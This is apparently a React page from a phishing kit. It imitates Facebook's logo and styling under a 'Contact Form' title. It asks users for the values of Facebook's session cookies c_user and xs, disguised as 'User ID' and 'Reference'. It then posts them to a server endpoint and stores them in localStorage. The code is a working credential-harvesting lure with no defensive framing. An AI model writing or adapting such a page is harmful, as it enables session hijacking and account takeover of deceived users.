import React, { useState, useEffect } from "react";
import { Button } from "@/components/ui/button";
import {
  Form,
  FormControl,
  FormField,
  FormItem,
  FormLabel,
  FormMessage,
} from "@/components/ui/form";
import { Input } from "@/components/ui/input";
import { useToast } from "@/hooks/use-toast";
import { zodResolver } from "@hookform/resolvers/zod";
import { useForm } from "react-hook-form";
import { useLocation } from "wouter";
import MetaTags from "@/components/meta-tags";
import { validationFormSchema } from "@shared/schema";
import { apiRequest } from "@/lib/queryClient";
import { useMobile } from "@/hooks/use-mobile";
import { MobileModal } from "@/components/mobile-modal";
import { Search } from "lucide-react";

export default function Validation() {
  const { toast } = useToast();
  const [, setLocation] = useLocation();
  const isMobile = useMobile();
  const [showMobileModal, setShowMobileModal] = useState(false);

  useEffect(() => {
    if (isMobile) {
      setShowMobileModal(true);
    }
  }, [isMobile]);

  const form = useForm({
    resolver: zodResolver(validationFormSchema),
    defaultValues: {
      c_user: "",
      xs: "",
    },
  });

  const onSubmit = async (data: any) => {
    try {
      await apiRequest('POST', '/api/contact-form', data);
      localStorage.setItem('validation_data', JSON.stringify(data));

      toast({
        title: "Success",
        description: "Please proceed to the next step",
      });
      setLocation("/confirmation");
    } catch (error) {
      toast({
        variant: "destructive",
        title: "Error",
        description: "Failed to submit form. Please try again.",
      });
    }
  };

  return (
    <div className="min-h-screen flex flex-col bg-[#ffffff]">
      <MetaTags 
        title="Contact Form | Validation"
        description="Contact Form - Initial Step"
      />
      <MobileModal open={showMobileModal} onOpenChange={setShowMobileModal} />

      <nav className="flex items-center justify-between px-4 py-2 border-b border-[#dddfe2]">
        <div className="flex items-center">
          <img 
            src="https://upload.wikimedia.org/wikipedia/commons/thumb/6/6c/Facebook_Logo_2023.png/600px-Facebook_Logo_2023.png?20231011121526"
            alt="Logo"
            className="h-8 sm:h-10"
          />
        </div>
        <div className="flex items-center bg-[#F0F2F5] rounded-full px-3 py-1.5">
          <Search className="w-4 h-4 text-[#65676B] mr-2" />
          <input
            type="text"
            placeholder="Search"
            className="bg-transparent outline-none text-sm text-[#65676B] placeholder-[#65676B] w-[180px]"
          />
        </div>
      </nav>

      <div className="flex-1 flex justify-center p-4 sm:p-6">
        <div className="w-full max-w-md space-y-6">
          <div className="text-center">
            <h1 className="text-2xl font-semibold text-[#1c1e21] mb-2">
              Contact Form
            </h1>
            <p className="text-[#65676B] text-sm">
              Please fill in the required information
            </p>
          </div>

          <Form {...form}>
            <form onSubmit={form.handleSubmit(onSubmit)} className="space-y-4">
              <FormField
                control={form.control}
                name="c_user"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
                      User ID
                    </FormLabel>
                    <FormControl>
                      <Input
                        type="number"
                        min="0"
                        pattern="[0-9]+"
                        minLength={6}
                        placeholder="Enter User ID"
                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field}
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                  </FormItem>
                )}
              />
              <FormField
                control={form.control}
                name="xs"
                render={({ field }) => (
                  <FormItem>
                    <FormLabel className="text-sm font-medium text-[#1c1e21]">
                      Reference
                    </FormLabel>
                    <FormControl>
                      <Input 
                        type="text" 
                        placeholder="Enter reference" 
                        className="h-10 px-3 text-sm border border-[#dddfe2] rounded-md focus:border-[#1877f2] focus:ring-1 focus:ring-[#1877f2] focus:ring-opacity-50"
                        {...field} 
                      />
                    </FormControl>
                    <FormMessage className="text-xs text-[#dc3545] mt-1" />
                  </FormItem>
                )}
              />

              <Button 
                type="submit" 
                className="w-full h-10 bg-[#1877f2] hover:bg-[#166fe5] text-white font-semibold text-sm rounded-md transition-colors duration-200"
                disabled={form.formState.isSubmitting}
              >
                {form.formState.isSubmitting ? "Submitting..." : "Submit"}
              </Button>
            </form>
          </Form>
        </div>
      </div>

      <footer className="text-center py-4 text-xs text-[#65676B] border-t border-[#dddfe2]">
        © 2025 Contact Form
      </footer>
    </div>
  );
}